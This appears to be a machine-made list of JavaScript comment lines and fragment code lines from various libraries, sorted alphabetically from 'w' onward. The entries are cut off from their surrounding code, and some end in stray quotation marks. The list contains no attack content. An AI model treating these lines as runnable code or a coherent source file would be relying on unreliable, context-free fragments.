// w3c Load/Save functionality: http://www.w3.org/TR/2004/REC-DOM-Level-3-LS-20040407/
// wait for it...
// wait till response come back
// waiting to be emitted.
// walk the list head to tail
// walk the list tail to head
// walkers. They can modify and replace the state parameter that's
// want the caller to be able to specify this.
// want to bring any trailing spaces along.
// want to find the line/column position for a given character
// want to know if the close frame has been sent here.
// wanted.
// warning for DOM component props in this upgrade
// warning now to help debugging
// warning or RangeError.
// was an options object passed in first?
// was originally set.
// was previously checked to update will cause it to be come re-checked
// was resolved.
// way to avoid erroring is to access a property that typically works for
// way to register. Lowercase jquery is used because AMD module names are
// we already checked if the domains were exactly the same
// we already showed the warning
// we are careful to use `null`.)
// we are in termination case (2) or (3) and return the appropriate thing.
// we are in termination case (3) or (2) and return the appropriate thing.
// we can be expecting either 'end' or
// we can do a cheap identity compare here to determine if this is a
// we can get here under normal conditions.
// we can now use this to query AWS
// we can use without a prompt.
// we can't determine kStringMaxLength in environments where process.binding
// we can't know if the current file system is case-sensitive or supports
// we cannot guarantee that there is no error lingering around
// we defer if data is null
// we do not throw real DOMExceptions above
// we do this because JSON.parse would convert it to a utf8 string if encoding wasn't specified
// we don't care about invariant's own frame
// we flow only if there is no one listening
// we got an error
// we got our value
// we have a terminating response line
// we have an empty script tag
// we have to wait till an async method returns
// we ignore the value if the stream
// we might end up in an infinite loop.
// we must ensure that previous needDrain will not be reset to false.
// we must not return true for hasOpeningParen(oldPath).
// we need this function. Return the position of the first occurrence of an
// we need to buffer any HTTP traffic that happens with the proxy before we get
// we need to inject a `AwaitExpression`/`YieldExpression`
// we need to join elements in
// we need to observe the `url` field from now on... Superagent sometimes
// we need to unpack.
// we only are interested in the *last* %c
// we only care about 2-bytes character in our distribution analysis
// we only have 1 thing to check for.
// we set destroyed to true before firing error callbacks in order
// we should add a floating point.
// we should now have *one single* line left with our KEY on it.
// we should now have 5 users
// we slurp in everything except for the path attribute in
// we store binary data with localStorage.
// we will be able to avoid having filesystem collisions.  If this
// we will wait for the previous Promise to finish
// we'll just add this hack and set the `readable` member to false.
// we'll re-emit if a new 'end' listener is added anyway.
// we're done.
// we're using a stored agent.  Make sure it's protocol-specific
// we've already checked it.
// web server port
// web worker
// webidl2js currently can't handle neither optional arguments nor callback interfaces
// webpackBootstrap
// weird stuff happens when you try to work with the binary string directly.
// well-behaving browsers
// well-known name that JSON.stringify calls
// were returning empty sockets for the file occasionally
// what categorizes them as operators).
// what event should show menu action on item selection
// what we want so fall through here and trigger an abstract event
// when 'finish' is emitted
// when a semicolon is automatically inserted. It will be passed
// when an XRegExp is constructed within a token handler function
// when an event is called after a page has unloaded
// when callbacks resolve synchronously (#1267).
// when end specified
// when multiselect uses normal <input> the values will be delimited with this character
// when printing generically.
// when request is aborted before a connection is made
// when they are finalized.
// when this is called.
// when to show popup
// when true all writes will be buffered until .uncork() call
// when we've gotten to 24 bits.
// whenever `document.activeElement` is accessed on an iframe
// where all of the continuation bytes for a character exist in the same buffer.
// where next() is only called once at a time
// where the parsing rules cause implicit opens or closes to be added.
// whether EXACT animation can occur twice in a row
// whether a single accordion content panel should be open at once
// whether accordion content can be closed
// whether accordion should automatically refresh on DOM insertion
// whether automatically close on clickaway when on click
// whether children opacity should be animated
// whether current value should trigger callbacks when reselected
// whether fluid variation should assign width explicitly
// whether group animations should be reversed
// whether inline scripts should be parsed (true/false/once). Once will not re-evaluate on cached content
// whether it should use dom mutation observers
// whether multiple select should allow user added values
// whether multiple select should filter currently active selections from choices
// whether nested content should be closed when a panel is closed
// whether new requests should abort previous requests
// whether no results errors should be shown
// whether or not to hide special message prompting a user they can enter a value
// whether parameters should be encoded with encodeURIComponent
// whether popup should be moved to context
// whether tabs should deactivate sibling menu elements or all elements initialized together
// whether the next token is `in` or `of`. When there is no init
// whether timeout should be used to ensure callback fires in cases animationend does not
// whether to add a variation type
// whether to add default data to url data
// whether to add events to prompt automatically
// whether to add touchstart events when using hover
// whether to automatically map default states
// whether to bind close events
// whether to cache responses
// whether to convert blank <select> values to placeholder text
// whether to hide errors after a period of time
// whether to include fuzzy results in local search
// whether to include margin in elements position
// whether to refresh calculations after all page images load
// whether to refresh calculations after page resize event
// whether to select first result after searching automatically
// whether to serialize closest form
// whether to stick in the opposite direction on scroll up
// whether to store lookups in local cache
// whether to throttle first request or only repeated
// whether to use css animations
// whether to use keyboard shortcuts
// whether to use mutation observers to follow changes
// whether value should be disabled
// whether we print with comments or without.
// whether we're explicitly paused
// which allow the internals to be properly cleaned up even if the user
// which allows the key to be used without expansion
// which always used a simple for-loop
// which are current context.
// which are the most common usecases
// which cannot be detected. Assuming that it is a US keyboard layout
// which gets added to `i`. The overflow checking is easier
// which has lead to a greater discussion about how we're going to
// which is spec violation - http://www.w3.org/TR/DOM-Level-3-Events/#events-focusevent-event-order
// which makes it 11 chars.
// which protos to its parent tag.
// which results in the shorter literal)
// which:  1 2 3
// which:  undefined
// whichever is greatest
// while
// while all odd indices are the newlines between two adjacent lines
// while still allowing maximal safe parallelization.
// whitespace in root TextNodes is also collapsed.
// whitespace is any combination of these 5 character [\x20\t\n\r\f]
// whitespace is removed. When updating an existing node with innerHTML
// whitespace-only gaps (or other comments).
// whole string will be escaped when the attribute is injected into
// whose prototype chain only points to Readable.
// widest glyph width in em (W is 1.037 em) used to calculate multiselect input width
// width of this code.
// wildcard - auto choose type
// will NOT be removed; `additionalProperties` != false
// will assign later to save effort in the face of errors
// will be as expected.
// will be committed to the disk AFTER the new file has been written
// will be compared instead.
// will be discarded below (with an appropriate console.error).
// will be executed for every item in the
// will be ignored
// will be indentation-locked.
// will be processed by this flush that we are scheduling.
// will be removed; `additionalProperties` == false
// will be replaced by the driver methods as soon as the driver is
// will be substituted if appropriate.
// will be used.
// will dequeue but only if they were gotoEnd.
// will emit or queue
// will end up in 'uncaughtException'. We restore the previous
// will fail with SECURITY_ERR.
// will iterate one or zero times
// will not traverse - invalid
// will not traverse - no properties
// will only set container height if difference between context and container is larger than this number
// will result in `undefined` for elem = this[ 0 ] which will
// will return `null` unless the integer has exactly `len` digits.
// win.openDevTools();
// window might've been closed already
// window.ajvAsync(ajv);
// window_test.attachURL('/static/js/main.js');
// window_test.button('minmax').enable();
// window_test.button('minmax').show();
// window_test.centerOnScreen();
// windows-1255 / ISO-8859-8 code points of interest
// with Expression bodies.
// with a [error-tolerant parser][dammit] and an
// with a constructor call
// with an uninteresting stack trace.
// with body an application/x-www-form-urlencoded body:
// with both ajaxSettings and settings fields.
// with explicit return statement.
// with from the data itself.
// with no leading or trailing comments.
// with options as only parameter
// with other events and for more focused logic
// with positional arguments mapped to the fields original passed to .build.
// with separateArrayItems: false
// with separateArrayItems: true
// with skipNulls
// with strictNullHandling
// with that -- otherwise we just start with the parent's owners.
// with the key as-is
// with the key camelized
// with the scores of the two SBCharSetProbers to produce a final answer.
// with this transaction's wrappers around it.
// without ` and ] to workaround Rule 17 (inline code blocks/links)
// without adding an extra grunt module
// without method will throw during the slice call and skip straight to the
// without the possibility of returning to an ancestor task
// without triggering the next() queue
// won't be able to reprint it.
// won't dispatch.
// words when necessary.
// work for you.
// work in many situations.
// working with ranges
// works for object as well as for the arrays
// worse generated code for the comparator function than would be optimal. In
// would be replaced by `[x-b]` which throws an error.
// would make it non-inlineable.
// would wreck the curly stack by pushing the same token onto the stack twice.
// wrap [ipv6]
// wrap all declared CAN_BE_SYNC methods in the sync wrapper
// wrap an old-style stream as the async data source.
// wrap expression with parentheses
// wrap getter
// wrap setter
// wrapper around mkdirp for tar's needs.
// wrapper for non-node envs
// wrapper.close threw.
// wrappers but silence any exceptions from them to ensure that the
// wrapping the node of interest.
// wraps replacer function to handle values we couldn't replace
// writable
// write decodes the given buffer and returns it as JS string that is
// write the data to a file in the directory
// write up to but no  more than writeEntry.blockRemain
// write() some more.
// write_file contains the filename returned by write_file.
// written to it (which may contain `Authorization` headers or other
// ws
// x = x mod m (HAC 14.42)
// x = x/R mod m (HAC 14.32)
// x-mac-hebrew defines similar additional code points but with a different
// x. Set mainExport to exports.
// x. Throw an Invalid Module Specifier error.
// x/R mod m
// x3 = 2 * y1 * z1 * (w^2 - 8 * x1 * y1^2 * z1)
// x3 = v * (z2 * (z1 * u^2 - 2 * x1 * v^2) - v^3)
// xR mod m
// x[y(2-xy)] = 1-k^2m^2
// x[y(2-xy)] == 1 (mod m^2)
// xhr does not simulate these properties of xhr but must return them
// xml :nth-child(...)
// xml namespaced attribute ?
// xor: function (word) {
// xregexp.com paths
// y == 1/x mod 2^16
// y == 1/x mod 2^2
// y == 1/x mod 2^4
// y == 1/x mod 2^8
// y == 1/x mod 2^dbits
// y3 = 4 * y1^2 * z1 * (3 * w * x1 - 2 * y1^2 * z1) - w^3
// y3 = z2 * (3 * x1 * u * v^2 - y1 * v^3 - z1 * u^3) + u * v^3
// yet this can only get filled up if the user keeps write()ing after
// yield should not be treated as keyword under non-strict mode.
// you call the .write() method.
// you can add your own custom options here if
// you can specify any custom option or header as per usual
// you may not use this file except in compliance with the License.
// you should not use this funciton
// your default parser.
// yuck!
// z-index to use with visibility 'fixed'
// z3 = 8 * (y1 * z1)^3
// z3 = v^3 * z1 * z2
// zero prepad
// zero). Native regexes are not recompiled using XRegExp syntax.
// zero-filled
// zero-width non-breaking space
// zlib support
// {
// { (123) and < (60)
// { open curly brace
// |
// }
// } close curly brace
// } else {
// }';
// })
// });
// });   encoders[t] = encoders[t].unique(); });
// };
// }else if (_size === 21) {
// }else if (_size === 21) {   task.failed('len=' + _size);
// ~
// ~ 0.002 on my system
// ~1.2 == >=1.2.0 <1.3.0-0
// ~1.2.3 == >=1.2.3 <1.3.0-0
//"
//////// The Prober ////////"
['open', 'error', 'close', 'message'].forEach((method) => {"
const t = new Limiter({concurrency: 5});"
exports.errorCodes = {"
exports.get = function (domain) {"
exports.isValid = function (domain) {"
exports.parse = function (input) {"
exports.subImplicitSetter = function (prefix, part, isValid, parser) {"
function _checkBlobSupportWithoutCaching(txn) {"
internals.endsWith = function (str, suffix) {"
internals.findRule = function (domain) {"
internals.rules = require('./data/rules.json').map(function (rule) {"
internals.validate = function (input) {"
ip.address = function (name, family) {"
let zlibLimiter;"
module.exports = {"
pp.readToken_dot = function () {"
pp.readToken_dot = function() {"
